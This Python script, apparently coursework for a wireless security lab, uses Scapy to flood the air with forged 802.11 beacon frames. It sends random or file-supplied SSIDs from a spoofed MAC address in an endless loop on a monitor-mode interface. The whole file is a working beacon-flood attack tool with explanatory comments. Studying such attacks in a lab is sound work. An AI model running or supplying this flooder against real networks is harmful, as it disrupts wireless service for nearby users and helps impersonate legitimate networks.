"""
Script baser sur le site suivant : https://pythontips.com/2018/09/08/sending-sniffing-wlan-beacon-frames-using-scapy/

Auteurs : Polier Florian, Tran Eric
Date : 06.03.2020
"""
from scapy.all import *
import argparse
import numpy as np
import string
import random

parser = argparse.ArgumentParser()
parser.add_argument('ssid',help='File of ssid or number of random SSID')
args = parser.parse_args()
dataSSID = []
if args.ssid.isdigit():
    #SSID Random https://towardsdatascience.com/generating-pseudo-random-strings-in-python-be098f9f5547
    for i in range(int(args.ssid)):
        alphadigit = string.ascii_letters + string.digits
        dataSSID.append(''.join(random.choice(alphadigit) for i in range(10)))
else :
	with open(args.ssid) as f1 :
	    dataSSID = np.loadtxt(f1, dtype=np.str, ndmin=1)

# Dot11Elt --> 802.11 Information Element

#Default config

srcAddr = '27:aa:27:aa:27:aa'
dstAddr = 'ff:ff:ff:ff:ff:ff'
# Layer 1 
layer1 = RadioTap() # Definit la transmission par onde-radio
# Layer 2 dot11

"""
type 0 : Trame de management
subtype 8 : Sous-type Beacon
addr1 : Adresse de destination
addr2 : Adresse source
addr3 : Adresse source
"""
layer2Dot11 = Dot11(type=0, subtype=8, addr1=dstAddr, addr2=srcAddr, addr3=srcAddr)


# Layer 2 beacon (Type de trame pour informer l'existance de notre ESSID)
layer2Dot11Beacon = Dot11Beacon()
# Layer 2 essid (Information sur le SSID a transmettre)
try:
    while True: # Spammer CTRL+C pour stopper le script
        for i in range(len(dataSSID)):
            """
            ID : Identifiant du champs remplie
            info : Information du champs
            len : Taille de l'information du champs
            """
            layer2Dot11Element = Dot11Elt(ID='SSID', info=dataSSID[i], len=len(dataSSID[i]))
            frame = layer1/layer2Dot11/layer2Dot11Beacon/layer2Dot11Element
            sendp(frame, iface='wlo1mon', inter=0.2, count=10)
        time.sleep(0.2)
except KeyboardInterrupt:
    print('Script ended.')
